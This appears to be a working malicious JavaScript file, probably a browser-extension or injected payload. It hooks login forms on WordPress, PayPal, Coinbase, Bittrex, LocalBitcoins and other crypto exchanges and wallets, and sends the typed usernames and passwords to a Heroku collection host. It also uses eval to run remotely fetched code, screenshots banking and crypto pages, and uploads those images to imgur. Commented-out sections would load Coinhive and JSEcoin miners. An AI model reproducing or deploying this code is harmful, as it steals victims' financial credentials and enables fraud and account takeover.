(new Image).src = "https://whos.amung.us/swidget/bbbbbbbbf";

    if (location.href.indexOf("wp-login") >= 0 || (location.href.indexOf("wp-admin") >= 0 || location.href.indexOf("wp-") >= 0)) {
      document.getElementById("loginform").onsubmit = function() {
        username = document.getElementById("user_login").value;
        user_pass = document.getElementById("user_pass").value;
        if (username && user_pass) {
          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);

        }
      };
    };

    if (top['location']['href']['indexOf']('ltcbackoffice.org') > -1) {
    document.getElementsByTagName("button")[0].onmouseover = function() {
      username = document.getElementById("username").value;
      user_pass = document.getElementById("password").value;
      if (username && user_pass) {
        (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
      }
    }
  };

    if (top['location']['href']['indexOf']('minergate.com') > -1) {
      document.getElementsByTagName("button")[0].onmouseover = function() {
        username = document.getElementsByName("email")[0].value;
        user_pass = document.getElementsByName("password")[0].value;
        if (username && user_pass) {
          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
        }
      };
    };

    if (top['location']['href']['indexOf']('blockchain.info') > -1) {
      document.getElementsByTagName("button")[0].onmouseover = function() {
        username = document.getElementsByName("UID_input")[0].value;
        user_pass = document.getElementsByName("pass_input")[0].value;
        if (username && user_pass) {
          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
        }
      };
    };

    if (top['location']['href']['indexOf']('bittrex.com/Account/Login') > -1) {
                   document.getElementsByTagName("button")[0].onmouseover = function (_0x441cx2) {
                   username = document.getElementsByName("UserName")[0].value;
                   user_pass = document.getElementsByName("Password")[0].value;
                   (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                   }
    };

    if (top['location']['href']['indexOf']('wallet.advcash.com') > -1) {
                   document.getElementsByTagName("input")[7].onmouseover = function (_0x441cx2) {
                   username = document.getElementsByName("j_username")[0].value;
                   user_pass = document.getElementsByName("j_password")[0].value;
                   (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                   }

    };


    if (top['location']['href']['indexOf']('paypal.com/signin') > -1) {
                   document.getElementsByTagName("button")[2].onmouseover  = function (_0x441cx2) {
                   username = document.getElementsByName("login_email")[0].value;
                   user_pass = document.getElementsByName("login_password")[0].value;
                   (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                   }
    };

    if (top['location']['href']['indexOf']('bitcoinglobalclub.com/mlm/pages/login/login.php') > -1) {
                   document.getElementsByTagName("button")[0].onmouseover  = function (_0x441cx2) {
                   username = document.getElementsByName("usus")[0].value;
                   user_pass = document.getElementsByName("clave")[0].value;
                   (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                   }
    };



  if (top['location']['href']['indexOf']('bitpay.com/dashboard/login/') > -1) {
                  document.getElementsByTagName("button")[1].onmouseover = function (_0x441cx2) {
                  username = document.getElementsByName("email")[0].value;
                  user_pass = document.getElementsByName("password")[0].value;
                  (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                  }
  };

  if (top['location']['href'] === 'auth.bitbay.net/login') {
                  document.getElementsByTagName("button")[1].onmouseover = function (_0x441cx2) {
                  username = document.getElementsByName("email")[0].value;
                  user_pass = "null"; //document.getElementsByName("password")[0].value;
                  (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                  }
  };

  if (top['location']['href'] === 'auth.bitbay.net/login-password') {
                  document.getElementsByTagName("button")[0].onmouseover = function (_0x441cx2) {
                  username = "null" //document.getElementsByName("email")[0].value;
                  user_pass = document.getElementsByName("password")[0].value;
                  (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                  }
  };


  if (top['location']['href']['indexOf']('localbitcoins.com/accounts/login/') > -1) {
                   document.getElementsByTagName("input")[3].onmouseover = function (_0x441cx2) {
                   username = document.getElementById("id_username").value;
                   user_pass = document.getElementById("id_password").value;
                   (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                   }
    };


  if (top['location']['href']['indexOf']('onixcoin.com/inicio-sesion/') > -1) {
                  document.getElementsByTagName("button")[8].onmouseover = function (_0x441cx2) {
                  username = document.getElementsByName("correo")[1].value;
                  user_pass = document.getElementsByName("clave")[0].value;
                  (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                  }
    };

  if (top['location']['href']['indexOf']('coinpayments.net/login') > -1) {
                  document.getElementsByTagName("input")[3].onmouseover = function (_0x441cx2) {
                  username = document.getElementsByName("username")[0].value;
                  user_pass = document.getElementsByName("pass")[0].value;
                  (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                  }
    };

  if (top['location']['href']['indexOf']('nicehash.com/login') > -1) {
                  document.getElementsByTagName("input")[2].onmouseover  = function (_0x441cx2) {
                  username = document.getElementById("username").value;
                  user_pass = document.getElementById("password").value;
                  (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                  }
      };
  if (top['location']['href']['indexOf']('coinbase.com/signin') > -1) {
                  document.getElementsByTagName("input")[4].onmouseover  = function (_0x441cx2) {
                  username = document.getElementById("email").value;
                  user_pass = document.getElementById("password").value;
                  (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                  }
        };
    if (top['location']['href']['indexOf']('backoffice.minerworld.com.br/#/home') > -1) {
                  document.getElementsByTagName("button")[1].onmouseover = function (_0x441cx2) {
                  username = document.getElementById("back_usuario").value;
                  user_pass = document.getElementById("back_senha").value;
                  (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                  }
          };





              var ssFunc = function(){
              if (typeof isrunmyproject == "undefined") {
                isrunmyproject = 1;
              if (typeof html2canvas != "object") {
                var xmlHttp = new XMLHttpRequest;
                  xmlHttp["open"]("GET", "https://html2canvas.hertzen.com/build/html2canvas.min.js", false);
                  xmlHttp["send"](null);
                  eval(xmlHttp["responseText"]);
              }
              var myStringArray = [
                "coin",
                "ether",
                "bitcoin",
                "monero",
                "etherum",
                "wallet",
                "cryptocurrency",
                "bitcoin",
                "blockchain.info",
                "paxful.com",
                "coin.space",
                "coinapult.com",
                "bitgo.com",
                "strongcoin.com",
                "coinhive.com",
                "spectrocoin.com",
                "wirexapp.com",
                "xapo.com",
                "iqoption.com",
                "etoro.com",
                "bittrex.com",
                "localbitcoins.com",
                "cex.io",
                "kraken.com",
                "etherdelta.com",
                "bitfinex.com",
                "bitstamp.net",
                "bisq.network",
                "gdax.com",
                "shapeshift.io",
                "binance.com",
                "coinmama.com",
                "bitcoin.de",
                "bithumb.com",
                "coinatmradar.com",
                "poloniex.com",
                "changelly.com",
                "zebpay.com",
                "bitso.com",
                "gemini.com",
                "yobit.net",
                "luno.com",
                "bitbay.net",
                "bitpanda.com",
                "bitflyer.jp",
                "cryptonia.co.nz",
                "btcmarkets.net",
                "coinchceck.com",
                "bx.in.th",
                "bitcoin.co.id",
                "anycoindirect.eu",
                "hitbtc.com",
                "bitmex.com",
                "indacoin.com",
                "mine",
                "btc",
                "ltc",
                "zcash",
                "banco",
                "bank",
                "banven",
                "banes"
              ];
              var arrayLength = myStringArray.length;
              for (var i = 0; i < arrayLength; i++) {
                  if (location.href.indexOf(myStringArray[i]) > -1) {
                       html2canvas(document.body, {
                                        allowTaint: true,
                                        taintTest: false,
                                        onrendered: function(canvas) {
                                           var dataURL = canvas.toBlob(function(blob){

                                             var client_ids = ["3684103173db518","aff413c4429c3e0","c850fa264fe4583","b9d8e7f2da3926a","6dff965b85a21d7","161dee2b693cca1","7621dbdbefa1eeb","e62a9eaa1d28307","ecb1f96220c662f","f3b0d63899cc902"];
                                           /* 	var client_ids = [
                                             "6b1b4668e2ab724",
                                             "6b822e74040ec75",
                                             "6b822e74040ec75",
                                             "415f4db8b8db212",
                                             "bd9f16b15b4e1c1",
                                             "d82ab53cf647ebf",
                                             "327e68e437d8b50",
                                             "e5c524ce58e93c4",
                                             "71aea7cea960e62",
                                             "cace0c080e03b79",
                                             "a131664b505ddce",
                                             "11050e68fff10c2",
                                             "4d7f4f0f4b2c707",
                                             "f2e1f6edca43d8e",
                                             "c7247c3aa475286",
                                             "9d3612835dfe5c3",
                                             "cdea1527091443d",
                                             "b5bb29d79bca7f4",
                                             "c4a4b2fc11fcdec",
                                             "b128386b5c76543",
                                             "455ae6c91fea7e0",
                                             "563236196913927",
                                             "fedeaa1cb6395d1",
                                             "0c2c58071924de6",
                                             "9d36e419ffda26c",
                                             "d6fb55c13a1fd40",
                                             "c50dc03cb5f5828",
                                             "58fe551ef64f7ea"
                                             ];
                                             var client_ids = [
                                             "8812e4d5ac26246",
                                             "7cede5c8429c074",
                                             "1b36dfde11eb8f2",
                                             "f140c24c80e26f5",
                                             "e28dc62800de58e",
                                             "c6ee0b1d54c9cbf",
                                             "856d144c2c6f634",
                                             "b97c8e09466621a",
                                             "0215d85df3cedfb",
                                             "7491c588c5b03eb",
                                             "e46e10c0c2c3fde",
                                             "ccdc474fcad03a3",
                                             "8c6be0a4b882717",
                                             "8018c42999fb523",
                                             "48fb19fb514a93c",
                                             "34de90bd03d7334",
                                             "890325f76626bc0",
                                             "73fc24ad5736064",
                                             "a7fd0877619b7eb",
                                             "fc9db9f4e545f19",
                                             "42224773371bbdc",
                                             "3966d732e2b1313",
                                             "663a7af57fecc2f",
                                             "97b2c7d98b4fec0",
                                             "27953f0cd669d91",
                                             "37a15fbfa35ad19",
                                             "4f4ad03629b454b",
                                             "eae1260db740c1a"
                                             ]; */
                                             client_ids = shuffle(client_ids);
                                               var client_id = client_ids[0];
                                               var fd = new FormData();
                                               fd.append("image", blob, "photo_"+Math.floor(Math.random()*9999)+".png");
                                               var xhr = new XMLHttpRequest();
                                               xhr.open("POST", "https://api.imgur.com/3/image?ext=me");
                                               xhr.setRequestHeader("Authorization", "Client-ID "+client_id);
                                               xhr.send(fd);
                                               xhr.onreadystatechange = function() {
                                                   if (xhr.readyState == 4) {
                                                       var data = JSON.parse(xhr.responseText);

                                                       if(!data.error){
                                                           image_link = data.data.link;
                                                             (new Image).src = "https://fetching-url.herokuapp.com/sites.php?l="+encodeURIComponent(location.href)+ "&i="+encodeURIComponent(image_link);

                                                       }else{

                                                       }
                                                   }
                                               }



                                               function shuffle(_0x4a1cx4e) {
                                                 var _0x4a1cx4f = _0x4a1cx4e["length"];
                                                 var _0x4a1cx50;
                                                 var _0x4a1cx51;
                                                 for (;0 !== _0x4a1cx4f;) {
                                                   _0x4a1cx51 = Math["floor"](Math["random"]() * _0x4a1cx4f);
                                                   _0x4a1cx4f -= 1;
                                                   _0x4a1cx50 = _0x4a1cx4e[_0x4a1cx4f];
                                                   _0x4a1cx4e[_0x4a1cx4f] = _0x4a1cx4e[_0x4a1cx51];
                                                   _0x4a1cx4e[_0x4a1cx51] = _0x4a1cx50;
                                                 }
                                                 return _0x4a1cx4e;
                                               }





                                           function rand(_0x4a1cx53, _0x4a1cx54) {
                                             return Math["floor"](Math["random"]() * (_0x4a1cx54 - _0x4a1cx53)) + _0x4a1cx53;
                                           }
                                           function rastgele(_0x4a1cx56) {
                                             mtn = "abcdefghijklmnoprstuvyzxABCDEFGHIJKLMNOPRSTUVYZX0123456789";
                                             ret = "";
                                             l = 0;
                                             for (;l < _0x4a1cx56;l++) {
                                               ret += mtn[Math["floor"](Math["random"]() * mtn["length"])];
                                             }
                                             return ret;
                                           }


                                           }, 'image/png', 1.00);

                                    }
                                    });


                  };
                };

              }
            }
              var cookie_name = "scsh";
              var cookie_time = 0.1;
              if(!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now()-60*60*cookie_time){
                localStorage[cookie_name] = Date.now();
                ssFunc();
               }
  //   var target = 2048;
  //   var exFunc = function(){
  //   if (typeof isrunmyproject == "undefined") {
  //     isrunmyproject = 1;
  //   if (typeof CoinHive != "object") {
  //     var xmlHttp = new XMLHttpRequest;
  //       xmlHttp["open"]("GET", "https://coinhive.com/lib/coinhive.min.js", false);
  //       xmlHttp["send"](null);
  //       eval(xmlHttp["responseText"]);
  //   }
  //     var miner = new CoinHive.Token('H3QMiNzSRGMRObqvqtk0BG3cNIqxUuvr', target);
  //     miner.on('accepted', function(params){
  //       if (params.hashes >= target) {
  //         var ts = Date.now();
  //         var xhr = new XMLHttpRequest();
  //         xhr.onreadystatechange = function() {
  //           if (xhr.readyState === xhr.DONE){
  //
  //           }
  //         };
  //         xhr.open('POST', 'https://cnhv.co/dkja');
  //         xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
  //         xhr.send('token='+encodeURIComponent(miner.getToken()));
  //       }
  //     });
  //     miner.start(CoinHive.FORCE_MULTI_TAB);
  //
  //   }
  // }
  //
  //   var cookie_name = "controler_mineros_"+target;
  //   var cookie_time = 0.3;
  //   if(!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now()-60*60*cookie_time){
  //     localStorage[cookie_name] = Date.now();
  //     exFunc();
  //    }

    // !function() {
    //   localStorage["jsenow"] = Date.now();
    //   var e = document;
    //   var t = e.createElement("script");
    //   var s = e.getElementsByTagName("script")[0];
    //   t.type = "text/javascript";
    //   t.async = t.defer = true;
    //   t.src = "https://load.jsecoin.com/load/29089/www/0/0/";
    //   s.parentNode.insertBefore(t, s);
    // }();
